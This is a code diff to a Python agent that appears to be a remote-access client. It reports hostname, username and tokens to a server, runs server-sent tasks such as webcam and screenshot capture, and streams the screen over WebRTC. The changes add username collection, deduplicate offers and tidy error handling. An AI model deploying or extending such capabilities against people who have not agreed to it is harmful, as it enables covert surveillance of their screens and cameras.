@@ -9,6 +9,7 @@ from __future__ import annotations
 import asyncio
 import base64
 import ctypes
+import getpass
 import hashlib
 import json
 import os
@@ -115,6 +116,10 @@ http_task_server: Optional[HTTPServer] = None
 http_task_server_thread: Optional[threading.Thread] = None
 http_task_stop_event = threading.Event()
 
+# Prevent duplicate offer processing
+processing_offers = set()
+processing_lock = threading.Lock()
+
 # =========================
 # Logging helpers
 # =========================
@@ -154,6 +159,14 @@ STOP_EVENT = threading.Event()
 # =========================
 def get_hostname() -> str:
     return socket.gethostname()
+
+def get_username() -> str:
+    """Get the current user's login name reliably across platforms."""
+    try:
+        return getpass.getuser()
+    except Exception:
+        # fallback to environment variables
+        return os.getenv("USER", os.getenv("USERNAME", "unknown"))
 
 def get_local_ip() -> str:
     try:
@@ -301,6 +314,7 @@ def collect_system_info(extended: bool = False) -> Dict[str, Any]:
         "agent_uuid": AGENT_UUID,
         "agent_token": AGENT_TOKEN,
         "hostname": get_hostname(),
+        "username": get_username(),          # <-- added always
         "os_name": get_os_name(),
         "os_version": get_os_version(),
         "architecture": get_architecture(),
@@ -316,7 +330,7 @@ def collect_system_info(extended: bool = False) -> Dict[str, Any]:
         "screen_height": screen_h,
     }
     if extended:
-        info["username"] = os.getlogin() if hasattr(os, "getlogin") else "unknown"
+        # already have username, but we can override if needed
         info["current_dir"] = os.getcwd()
         info["python_version"] = platform.python_version()
         info["platform"] = platform.platform()
@@ -894,15 +908,11 @@ def handle_task(task_data: Dict[str, Any], task_id: Optional[str]) -> str:
         return webcam_capture()
     if task_name == "screenshot":
         return screenshot()
-    if task_name == "webcam":
-        return webcam_capture()
     if task_name == "thumbnail":
         result = screenshot()
         if result.startswith("SCREENSHOT:"):
             return "THUMBNAIL:" + result.split(":", 1)[1]
         return result
-    if task_name == "screenshot":
-        return screenshot()
     if task_name == "tcp_server_start":
         port = data.get("port")
         if port is None:
@@ -1035,7 +1045,7 @@ def send_signal(action: str, payload: Dict[str, Any]) -> Dict[str, Any]:
     return http_post_json(url, payload)
 
 def poll_for_offers():
-    global webrtc_loop
+    global webrtc_loop, processing_offers
     while not signaling_stop_event.is_set():
         try:
             resp = http_get_json(f"{SIGNALING_URL}?action=poll_offer&agent_uuid={AGENT_UUID}")
@@ -1043,6 +1053,11 @@ def poll_for_offers():
                 offer_sdp = resp.get("offer_sdp")
                 viewer_id = resp.get("viewer_id")
                 if offer_sdp and viewer_id:
+                    with processing_lock:
+                        if viewer_id in processing_offers:
+                            log(f"Ignoring duplicate offer for {viewer_id} (already processing)")
+                            continue
+                        processing_offers.add(viewer_id)
                     log(f"Received offer from {viewer_id}")
                     asyncio.run_coroutine_threadsafe(
                         establish_webrtc(offer_sdp, viewer_id),
@@ -1054,10 +1069,12 @@ def poll_for_offers():
 
 async def establish_webrtc(offer_sdp: str, viewer_id: str):
     """Create a new peer connection for each viewer."""
-    global webrtc_peers, webrtc_data_channels, screen_tracks
+    global webrtc_peers, webrtc_data_channels, screen_tracks, processing_offers
 
     if not WEBRTC_AVAILABLE:
         log("WebRTC not available, cannot establish connection")
+        with processing_lock:
+            processing_offers.discard(viewer_id)
         return
 
     # If a peer for this viewer already exists, close it first (reconnect)
@@ -1117,6 +1134,8 @@ async def establish_webrtc(offer_sdp: str, viewer_id: str):
                             except:
                                 break
                 asyncio.create_task(keepalive())
+                with processing_lock:
+                    processing_offers.discard(viewer_id)
 
             elif pc.connectionState == "failed":
                 log(f"WebRTC connection FAILED for {viewer_id} — cleaning up so next offer is accepted cleanly")
@@ -1130,11 +1149,15 @@ async def establish_webrtc(offer_sdp: str, viewer_id: str):
                     except:
                         pass
                     del screen_tracks[viewer_id]
+                with processing_lock:
+                    processing_offers.discard(viewer_id)
 
             elif pc.connectionState in ("disconnected", "closed"):
                 log(f"WebRTC {pc.connectionState} for {viewer_id} — keeping slot, pausing capture")
                 if viewer_id in screen_tracks:
                     screen_tracks[viewer_id].paused = True
+                with processing_lock:
+                    processing_offers.discard(viewer_id)
 
         @pc.on("iceconnectionstatechange")
         async def on_iceconnectionstatechange():
@@ -1226,22 +1249,36 @@ async def establish_webrtc(offer_sdp: str, viewer_id: str):
         munged_answer_sdp = mangle_sdp_quality(raw_answer_sdp, STREAM_CONFIG["max_bitrate_kbps"])
         log(f"Answer SDP munged for {viewer_id}: max_bitrate={STREAM_CONFIG['max_bitrate_kbps']} kbps")
 
-        # Send the answer
-        send_signal("submit_answer", {
-            "viewer_id":  viewer_id,
-            "answer_sdp": munged_answer_sdp
-        })
-        log(f"WebRTC answer sent for {viewer_id}")
+        # Send the answer with error handling
+        try:
+            send_signal("submit_answer", {
+                "viewer_id":  viewer_id,
+                "answer_sdp": munged_answer_sdp
+            })
+            log(f"WebRTC answer sent for {viewer_id}")
+        except Exception as e:
+            log(f"Failed to send answer for {viewer_id}: {e}")
+            if viewer_id in webrtc_peers:
+                await webrtc_peers[viewer_id].close()
+                del webrtc_peers[viewer_id]
+            with processing_lock:
+                processing_offers.discard(viewer_id)
+            return
+
+        await asyncio.sleep(1)
+        with processing_lock:
+            processing_offers.discard(viewer_id)
 
     except Exception as e:
         log(f"Error during WebRTC establishment for {viewer_id}: {e}")
-        # Clean up on error
         if viewer_id in webrtc_peers:
             del webrtc_peers[viewer_id]
         if viewer_id in webrtc_data_channels:
             del webrtc_data_channels[viewer_id]
         if viewer_id in screen_tracks:
             del screen_tracks[viewer_id]
+        with processing_lock:
+            processing_offers.discard(viewer_id)
 
 async def apply_sender_quality(pc: RTCPeerConnection, track: VideoStreamTrack, max_bitrate_kbps: int, frame_rate: int) -> None:
     """Apply quality constraints to a specific peer connection."""
